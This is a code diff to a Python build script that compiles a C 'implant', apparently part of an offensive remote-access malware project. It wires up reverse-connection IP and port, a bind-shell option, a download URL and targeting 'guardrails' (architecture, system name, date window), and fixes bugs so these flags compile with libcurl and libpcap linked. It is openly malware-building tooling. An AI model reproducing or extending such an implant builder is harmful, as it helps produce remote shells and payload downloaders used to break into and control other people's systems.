@@ -15,10 +15,10 @@ import os
 #------------------------------#
 
 # Change the CWD to src in order to have access to the .c and .h files
-# os.chdir('../')
+os.chdir('../')
 
 # The path(s) to all of the .c and .h files to be included in the implant
-implant_c_path = "testing.c"
+implant_c_path = "main.c"
 
 # Available implant compiler choices
 # TODO: Update this line in argparser to match the currently available options
@@ -118,10 +118,11 @@ if args.reverseIP != "unknown":
 if args.reversePort != "unknown":
     cmdString.insert(1, "-D PORT=\"" + (args.reversePort) + "\"")
 if args.bindShell != 999999:
-    cmdString.insert(1, "-D PORT=\"" + (args.bindShell) + "\"")
+    cmdString.insert(1, "-D PORT=\"" + str((args.bindShell)) + "\"")
 if args.downloadURL != "www.example.com":
     cmdString.insert(1, "-D URL=\"" + (args.downloadURL) + "\"")
-    cmdString.append("-lcurl")  # -lcurl is required to include the libcurl library
+if args.bindShell != 999999:
+    cmdString.insert(1, "-D BIND")
 
 ##### Guardrails #####
 if args.architecture != "unknown":
@@ -143,12 +144,13 @@ if args.systemname != "unknown":
 if args.startdate != "unknown":
     cmdString.insert(1, "-D STRD=\"" + (args.startdate) + "\"")
 if args.enddate != "unknown":
-
     cmdString.insert(1, "-D ENDD=\"" + (args.enddate) + "\"")
 
 ##### Implant Testing #####
 if args.debug:
     cmdString.insert(1, "-D DEBUG")
+cmdString.append("-lcurl")  # -lcurl is required to include the libcurl library
+cmdString.append("-lpcap")  
 
 print(cmdString)
 
